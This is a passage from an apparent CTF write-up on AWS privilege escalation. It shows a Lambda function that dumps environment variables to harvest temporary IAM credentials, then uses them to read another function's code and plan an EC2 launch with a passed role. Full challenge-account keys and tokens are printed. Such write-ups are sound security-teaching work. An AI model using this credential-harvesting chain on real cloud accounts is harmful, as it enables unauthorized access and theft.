</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>exports</span><span class=p>.</span><span class=nx>handler</span> <span class=o>=</span> <span class=kr>async</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>,</span> <span class=nx>context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;ENVIRONMENT VARIABLES\n&#34;</span> <span class=o>+</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;EVENT\n&#34;</span> <span class=o>+</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>event</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>context</span><span class=p>.</span><span class=nx>logStreamName</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Admittedly, all these resources came from the <a href=https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-awscli.html>AWS documentation</a>, and I didn&rsquo;t really have to re-invent the wheel myself too much :)</p><p>We then run the <code>aws lambda create-function</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws lambda create-function --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name <span class=k>$(</span>./get_username.sh<span class=k>)</span>-env --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;FunctionName&#34;</span>: <span class=s2>&#34;user-59b23d07b5ee4cb2a64d1e481dd4f235-env&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;FunctionArn&#34;</span>: <span class=s2>&#34;arn:aws:lambda:ap-southeast-1:051751498533:function:user-59b23d07b5ee4cb2a64d1e481dd4f235-env&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Runtime&#34;</span>: <span class=s2>&#34;nodejs12.x&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Role&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/lambda_agent_development_role&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Handler&#34;</span>: <span class=s2>&#34;index.handler&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;CodeSize&#34;</span>: 322,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Description&#34;</span>: <span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Timeout&#34;</span>: 3,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;MemorySize&#34;</span>: 128,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;LastModified&#34;</span>: <span class=s2>&#34;2022-09-10T18:11:29.774+0000&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;CodeSha256&#34;</span>: <span class=s2>&#34;mh7aiyjDJPgtppb5wSC73zT6O0hWHAeBd9pJAE8UcX4=&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;</span><span class=nv>$LATEST</span><span class=s2>&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;TracingConfig&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Mode&#34;</span>: <span class=s2>&#34;PassThrough&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;RevisionId&#34;</span>: <span class=s2>&#34;ecd42252-5578-4e2d-bfb5-738369d59009&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;State&#34;</span>: <span class=s2>&#34;Pending&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;StateReason&#34;</span>: <span class=s2>&#34;The function is being created.&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;StateReasonCode&#34;</span>: <span class=s2>&#34;Creating&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PackageType&#34;</span>: <span class=s2>&#34;Zip&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Architectures&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;x86_64&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;EphemeralStorage&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Size&#34;</span>: <span class=m>512</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=invoking-the-lambda-function>Invoking the Lambda Function<a hidden class=anchor aria-hidden=true href=#invoking-the-lambda-function>#</a></h3><p>Alright we successfully created our Lambda function! Now to invoke it! We can use the <code>aws lambda invoke</code> command to do so, and with some bash magic, decode our AWS credentials stored in environment variables:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws lambda invoke --function-name <span class=k>$(</span>./get_username.sh<span class=k>)</span>-env out --log-type Tail --query <span class=s1>&#39;LogResult&#39;</span> --output text <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;Omitted&gt;
</span></span><span class=line><span class=cl><span class=s2>&#34;AWS_SESSION_TOKEN&#34;</span>: <span class=s2>&#34;IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ==&#34;</span>,
</span></span><span class=line><span class=cl><span class=s2>&#34;AWS_SECRET_ACCESS_KEY&#34;</span>: <span class=s2>&#34;qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4&#34;</span>,
</span></span><span class=line><span class=cl><span class=s2>&#34;AWS_ACCESS_KEY_ID&#34;</span>: <span class=s2>&#34;ASIAQYDFBGMS6PHR4NFX&#34;</span>,
</span></span><span class=line><span class=cl>&lt;Omitted&gt;
</span></span></code></pre></td></tr></table></div></div><p>Alright, we now have our set of temporary AWS IAM credentials! Recalling back, this set of permissions should allow us to get the <code>cat-service</code> function, lets go ahead and attempt that!</p><p>We first set up our new temporary IAM credentials under the profile lambda:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ cat ~/.aws/credentials
</span></span><span class=line><span class=cl><span class=o>[</span>default<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>aws_access_key_id</span> <span class=o>=</span> AKIAQYDFBGMS6OKAFSZK
</span></span><span class=line><span class=cl><span class=nv>aws_secret_access_key</span> <span class=o>=</span> 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
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>lambda<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>aws_access_key_id</span> <span class=o>=</span> ASIAQYDFBGMS6PHR4NFX
</span></span><span class=line><span class=cl><span class=nv>aws_secret_access_key</span> <span class=o>=</span> qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4
</span></span><span class=line><span class=cl><span class=nv>aws_session_token</span> <span class=o>=</span>  <span class=s2>&#34;IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ==&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>We then run the <code>aws lambda get-function</code> command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>─$ aws --profile lambda --region ap-southeast-1 lambda get-function --function-name cat-service
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Configuration&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;FunctionName&#34;</span>: <span class=s2>&#34;cat-service&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;FunctionArn&#34;</span>: <span class=s2>&#34;arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Runtime&#34;</span>: <span class=s2>&#34;python3.9&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Role&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/lambda_agent_development_role&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Handler&#34;</span>: <span class=s2>&#34;main.lambda_handler&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CodeSize&#34;</span>: 416,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Description&#34;</span>: <span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Timeout&#34;</span>: 3,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;MemorySize&#34;</span>: 128,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;LastModified&#34;</span>: <span class=s2>&#34;2022-08-23T13:16:19.469+0000&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CodeSha256&#34;</span>: <span class=s2>&#34;52UWd1KHAZub5aJIS953mHrKVM0mFPiVBuGahWFGaz4=&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;</span><span class=nv>$LATEST</span><span class=s2>&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;TracingConfig&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Mode&#34;</span>: <span class=s2>&#34;PassThrough&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;RevisionId&#34;</span>: <span class=s2>&#34;90be1b48-3339-4a78-a083-b77e285b7b8a&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;State&#34;</span>: <span class=s2>&#34;Active&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;LastUpdateStatus&#34;</span>: <span class=s2>&#34;Successful&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;PackageType&#34;</span>: <span class=s2>&#34;Zip&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Architectures&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;x86_64&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>]</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;EphemeralStorage&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Size&#34;</span>: <span class=m>512</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Code&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;RepositoryType&#34;</span>: <span class=s2>&#34;S3&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Location&#34;</span>: <span class=s2>&#34;https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgcFR%2ByqeFPsLsztRFsEaIgopn3O%2FbCQ97F4%2FtgRdacQ0CIQDNPJ4PAXpD2t3lwkeU5oDclmHFskzLYBcqDS4oOSmJAyrbBAhiEAQaDDI5NTMzODcwMzU4MyIMOSYKz4ikB%2FBj%2B%2FM2KrgELWb0iH%2BJs3xS4ntDTYKOgC0o707KUG77Mr5wTSvf2X8D85DmEofY%2BJt3E9BTji6Z%2BSgi6XDnavRmB%2BU9Bep9IJch1KDXpyhME%2FCU3TgmilFuifG4RMXE6G%2B1fQoAx3YzT7IGnrBDaNKDZahLIN0dBivAIr%2BdTO%2FodtdSzII66w4FvTT2EDeNpRogrdoCsTU0YyhsersYI26vHqEtRvQAoEZdv94tWfg0Q5ZoKJyHX7f7Ta5BNvl2pgSRIT84GD%2BXZqbPQ%2BjEcNaFGE4HDg1m%2BBpclTwYIW%2FNWFHf47RO%2BFFpkCPJfAohxIM2LnZrH9nZM9Fjcm4XFHwcdHsip4JG762UJQnWGsG9DD9xWhl3pMAYI%2B6u3skDKC42YZtg12WvxSaDDT3YmoPFv6%2FSapmZCSGbvuBXdkwz9wI%2FGe6MLDchr%2FCrfAGb9WJc4X%2BvVR%2FJhcNAoL2bIby43pTpXLSRWIT%2FZoXES5Ly0P05kFvNFxZkTrvXEAWLsrV53ShhO7kgJSWzvY0g%2F4%2B5EuulEiMkapp2F2FMo3aDcfKB8uCvQB0L0WouqtKlOE5Mqhy0C%2Bxq7LwEDGTSvoYPbe%2BvWcjWuGXIlQMmNEjhY%2F2aB1JOrKfkGsj3nr0li8LQeGokQuQZF7dunDnfdiR8hgg4qiWygMUEKz60s%2By23w6XGRHoqEGVT9N8NykpCsiqbb0MbwVEqwS5wF67mSFcEStxaD7hqeoxpAx6rAoZm1PKp%2F0844rX38Rpo2%2F7czC2l%2FOYBjqpAdgVxmoBzKoXM2%2FWlUi6yc19yOwnATeAuDM33gHlKNJvbiGCIY9CgvDWxVNGeh5I6m2ZbPtQzFBGmkuFHVUAnkCwLLutv%2FD%2F%2FbgtCUYiuVYo9bGoMSXZg85f27ik2d4BfuF%2Byd4WJxjBqrYKCfWWyCFAgLtLvFL8FeEQvaG0QT8TCyxUzGaGhKhrYpnsN43p7B8xSu%2BfMctTiF1vRTSHUi7sHMxAFddWlAE%3D&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20220910T181953Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Credential=ASIAUJQ4O7LP5TW7TD4A%2F20220910%2Fap-southeast-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=c155a8c3de9346b2327fe9c053e01bc10e3304204b4ce81557d10eb349a38d08&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Oh, an interesting domain! Accessing the domain would bring us to a zip file when unzipped reveal a <code>main.py</code> file that contains the following piece of code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>boto3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>lambda_handler</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=n>context</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Work in Progress: Requires help from Agents! </span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># ec2 = boto3.resource(&#39;ec2&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># instances = ec2.create_instances(</span>
</span></span><span class=line><span class=cl>    <span class=c1>#    ImageId=&#34;???&#34;,</span>
</span></span><span class=line><span class=cl>    <span class=c1>#    MinCount=1,</span>
</span></span><span class=line><span class=cl>    <span class=c1>#    MaxCount=1,</span>
</span></span><span class=line><span class=cl>    <span class=c1>#    InstanceType=&#34;t2.micro&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1>#)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;results&#39;</span><span class=p>:</span> <span class=s1>&#39;This is work in progress. Agents, palindrome needs your help to complete the workflow! :3&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Based on this hint, it seems like the next step is to actually create and run an EC2 instance! Now let&rsquo;s take a step back and see what we just did so far</p><p><img loading=lazy src=/images/posts/tisc-2022-level4-diagram-2.jpg alt=diagram-2></p><p>(During the actual CTF I actually created a reverse shell into the temporary Lambda instance. It was unnecessary but I thought it was cool to point out that it is indeed possible to execute arbitary code on the Lambda instance, and create a reverse shell although what you can do on the instance is kind of limited and for the purpose of this CTF, you really only want the temporary AWS IAM keys).</p><h2 id=running-an-ec2-instance>Running an EC2 Instance<a hidden class=anchor aria-hidden=true href=#running-an-ec2-instance>#</a></h2><p>At this junction, our goal is to not just run any EC2 instance, but if you recall earlier on, the <code>ec2_agent_role</code> has permissions to interat with the <code>dynamodb</code> service. Lett&rsquo;s take a look once again at what permissions the <code>lambda_development_agent_role</code> has:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;ec2:RunInstances&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;ec2:CreateVolume&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;ec2:CreateTags&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;iam:PassRole&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:iam::051751498533:role/ec2_agent_role&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Sid&#34;</span><span class=p>:</span> <span class=s2>&#34;VisualEditor2&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>So, not only can it run EC2 instances but it also has the ability to pass on the <code>ec2_agent_role</code> on to the EC2 instance created, which is exactly what we need! In the context of EC2 instances, one can&rsquo;t simply attach a &ldquo;role&rdquo; to an EC2 instance like this. If one wished to give a role to an EC2 instance, one would have to create an EC2 instance profile and attach said profile to the EC2 instance.</p><p>If we recall, our initial user credentials had the permissions to run the <code>aws iam list-instance-profiles</code>, and if we ran that command, we would indeed see an instance profile <code>ec2_agent_instance_profile</code> that has the <code>ec2_agent_role</code> attached to it already:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam list-instance-profiles                                                              
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;InstanceProfiles&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Path&#34;</span>: <span class=s2>&#34;/&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;InstanceProfileName&#34;</span>: <span class=s2>&#34;ec2_agent_instance_profile&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;InstanceProfileId&#34;</span>: <span class=s2>&#34;AIPAQYDFBGMS6EKSSQ2RF&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-07-22T09:29:35Z&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Roles&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Path&#34;</span>: <span class=s2>&#34;/&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;RoleName&#34;</span>: <span class=s2>&#34;ec2_agent_role&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;RoleId&#34;</span>: <span class=s2>&#34;AROAQYDFBGMSYSEMEVAEH&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/ec2_agent_role&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-07-22T09:29:34Z&#34;</span>,
